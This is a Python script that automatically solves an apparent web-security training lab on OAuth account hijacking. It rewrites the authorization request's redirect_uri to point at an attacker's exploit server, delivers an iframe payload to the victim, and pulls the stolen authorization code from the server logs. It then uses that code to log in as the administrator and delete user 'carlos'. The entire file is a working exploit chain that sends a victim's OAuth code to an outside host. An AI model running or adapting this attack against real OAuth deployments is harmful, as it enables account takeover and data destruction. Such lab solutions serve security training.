import requests
import re
import time
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.exploit_server_url = None
        self.session = requests.Session()
        self.request_authorization_url = None
        self.code = None

    def get_csrf_token(self, endpoint):
        response = self.session.get(self.lab_url + endpoint)
        return re.search('value="(.*)"', response.text).group(1)

    def sign_in_as_my_account(self):
        response = self.session.get(self.lab_url + 'my-account')
        self.exploit_server_url = re.findall('<a id=\'exploit-link\' class=\'button\' target=\'_blank\' '
                                             'href=\'(.*)\'>', response.text)[0] + '/'
        self.request_authorization_url = re.findall('<meta.*url=(.*)\'>', response.text)[0]
        redirect_uri = self.request_authorization_url.split('redirect_uri=')[1].replace(self.lab_url,
                                                                                        self.exploit_server_url)
        self.request_authorization_url = (self.request_authorization_url.split('redirect_uri=')[0] + 'redirect_uri=' +
                                          redirect_uri.replace('/oauth-callback', ''))

    def deliver_exploit(self):
        data = {
            'urlIsHttps': 'on',
            'responseFile': '/exploit',
            'responseHead': 'HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8',
            'responseBody': '',
            'formAction': 'DELIVER_TO_VICTIM'
        }
        response_body = '<iframe src="{}"></iframe>'.format(self.request_authorization_url)
        data['responseBody'] = response_body
        self.session.post(self.exploit_server_url, data=data)

    def get_exploit_server_logs(self):
        response = self.session.get(self.exploit_server_url + 'log')
        self.code = re.findall(r'(\?code=.*) HTTP', response.text)[0]

    def sign_in_as_admin(self):
        self.session.get(self.lab_url + 'oauth-callback' + self.code)

    def delete_victim(self):
        self.session.get(self.lab_url + 'admin/delete?username=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.sign_in_as_my_account()
        self.deliver_exploit()
        time.sleep(5)
        self.get_exploit_server_logs()
        self.sign_in_as_admin()
        self.delete_victim()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
